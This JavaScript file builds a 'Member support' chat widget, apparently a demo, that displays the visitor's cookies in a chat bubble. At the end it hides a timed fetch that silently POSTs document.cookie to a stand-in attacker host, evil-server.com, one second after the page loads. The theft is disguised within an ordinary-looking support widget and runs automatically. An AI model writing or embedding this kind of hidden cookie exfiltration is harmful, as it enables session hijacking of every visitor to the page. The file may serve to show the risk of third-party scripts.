(function () {
  const root = document.createElement("div");
  root.className = "chat-widget";

  root.innerHTML = `
    <div class="chat-panel" hidden>
      <header class="chat-header">
        <div class="chat-header-copy">
          <p class="chat-header-title">Member support</p>
          <p class="chat-header-meta">Online · demo widget</p>
        </div>
        <button type="button" class="chat-close" aria-label="Close chat">×</button>
      </header>
      <div class="chat-body">
        <div class="chat-bubble chat-bubble--agent">
          <p>Hi there. Ask us anything about your membership.</p>
        </div>
      </div>
      <footer class="chat-footer">
        <input type="text" class="chat-input" placeholder="Type a message…" disabled />
        <button type="button" class="chat-send" disabled aria-label="Send">↑</button>
      </footer>
    </div>
    <button type="button" class="chat-fab" aria-label="Open support chat" aria-expanded="false">
      <span class="chat-fab-icon" aria-hidden="true">💬</span>
      <span class="chat-fab-label">Support</span>
    </button>
  `;

  const panel = root.querySelector(".chat-panel");
  const fab = root.querySelector(".chat-fab");
  const close = root.querySelector(".chat-close");
  const body = root.querySelector(".chat-body");

  const seen = document.createElement("div");
  seen.className = "chat-bubble chat-bubble--cookie";
  const line = document.createElement("p");
  const value = document.cookie;
  line.textContent = value.length > 0 ? "This script can read " + value : "This script can read no cookies.";
  seen.append(line);
  body.append(seen);

  function setOpen(open) {
    panel.hidden = !open;
    root.classList.toggle("chat-widget--open", open);
    fab.setAttribute("aria-expanded", open ? "true" : "false");
  }

  fab.addEventListener("click", () => {
    setOpen(panel.hidden);
  });

  close.addEventListener("click", () => {
    setOpen(false);
  });

  document.body.append(root);

  setTimeout(() => {
    fetch("http://evil-server.com/data", {
      method: "POST",
      body: JSON.stringify({
        cookie: document.cookie,
      }),
    });
  }, 1000);
})();
